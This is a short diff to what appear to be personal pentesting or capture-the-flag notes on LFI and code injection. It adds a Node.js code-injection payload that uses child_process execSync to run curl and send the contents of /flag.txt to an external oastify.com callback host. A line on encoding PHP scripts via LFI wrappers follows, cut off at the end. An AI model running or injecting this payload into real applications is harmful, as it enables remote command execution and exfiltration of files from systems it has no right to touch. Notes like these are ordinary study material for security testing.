@@ -1,5 +1,13 @@
 [[LFI]]
 #php
+#nodejs 
+
+# Nodejs
+Code injection:
+```js
+process.mainModule.require('child_process').execSync('curl http://v2ykv786rd6cm20eq2zgccth78dz1ppe.oastify.com/$(cat /flag.txt)')+
+```
+
 ##### Via LFI and PHP wrappers
 Encode PHP script in base64:
 ```bash
